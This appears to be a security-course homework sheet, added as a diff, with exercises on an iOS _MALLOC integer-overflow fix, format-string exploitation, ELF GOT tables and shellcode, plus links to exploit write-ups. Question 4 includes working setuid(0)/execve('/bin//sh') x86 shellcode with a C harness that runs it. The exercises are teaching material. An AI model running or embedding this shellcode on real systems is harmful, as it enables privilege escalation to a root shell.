@@ -1,0 +1,84 @@
+1、 （选做）Memory management
+
+The iOS   _MALLOC(size_t size, int type, int flags) function allocates size bytes on the heap. Internally blocks are represented as a length field followed by a data field:
+
+    struct _mhead {
+      size_t  mlen;
+      char    dat[0];  }
+The mlen field is used by the free() function to determine how much space needs to be freed. In iOS 4.x the _MALLOC function was implemented as follows:
+
+1   void * _MALLOC(size_t size, int type, int flags)  {
+2     struct _mhead  *hdr;
+3     size_t memsize = sizeof (*hdr) + size;
+4     hdr = (void *)kalloc(memsize);  // allocate memory
+5     hdr->mlen = memsize;
+6     return  (hdr->dat);
+7   }
+In iOS 5.x the following two lines were added after line 3:
+    int o = memsize < size ? 1 : 0;
+    if (o)  return (NULL);
+Why were these lines added in iOS5.x? Briefly describe an attack that may be possible without these lines.
+
+2、
+为了顺利完成下节课，建议仔细阅读下面这篇文章的Level 9部分：
+https://infamoussyn.com/2013/09/11/smashthestack-io-walkthrough-part-b-levels-6-10/
+https://tomasuh.github.io/2015/01/19/IO-Wargame.html
+，文章中利用.dtors的办法只是利用格式化字符串执行shellcode的一种形式。
+printf中%2$d这类格式的含义如下：
+Character Description 
+n$ 
+
+n is the number of the parameter to display using this format specifier, allowing the parameters provided to be output multiple times, using varying format specifiers or in different orders. This is a POSIX extension and not in C99. 
+Example: printf("%2$d %1$#x %1$d",16,17) produces "17 0x10 16" 
+
+3、描述linux ELF文件中，全局偏移表GOT表(Global Offset Table)的作用。
+
+4、解释一下什么叫shellcode。下面这段代码被root编译并且suid后，普通用户是否能获得root shell？解释"\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"其中的含义。
+
+/*
+ * gcc -z execstack -o setuid-linux setuid-linux.c *
+ * setuid-linux.c - setuid/execve shellcode for Linux/x86
+ 
+ * Short fully-functional setuid(0) and /bin/sh execve() shellcode.
+ */
+
+/* 
+ * setuid(0)
+ *
+ * 8049380:       6a 17                   push   $0x17
+ * 8049382:       58                      pop    %eax
+ * 8049383:       31 db                   xor    %ebx,%ebx
+ * 8049385:       cd 80                   int    $0x80
+ *
+ * execve("/bin//sh", ["/bin//sh"], NULL)
+ *
+ * 8049387:       6a 0b                   push   $0xb
+ * 8049389:       58                      pop    %eax
+ * 804938a:       99                      cltd   
+ * 804938b:       52                      push   %edx
+ * 804938c:       68 2f 2f 73 68          push   $0x68732f2f
+ * 8049391:       68 2f 62 69 6e          push   $0x6e69622f
+ * 8049396:       89 e3                   mov    %esp,%ebx
+ * 8049398:       52                      push   %edx
+ * 8049399:       53                      push   %ebx
+ * 804939a:       89 e1                   mov    %esp,%ecx
+ * 804939c:       cd 80                   int    $0x80
+ */
+
+char sc[] = /* 7 + 23 = 30 bytes */
+"\x6a\x17\x58\x31\xdb\xcd\x80"
+"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80";
+
+main()
+{
+	int (*f)() = (int (*)())sc; f();
+}
+
+5、阅读
+https://www.exploit-db.com/exploits/36858
+https://www.exploit-db.com/shellcodes/44321
+
+6、阅读
+格式化字符串漏洞解析
+https://bbs.pediy.com/thread-261940.htm
+
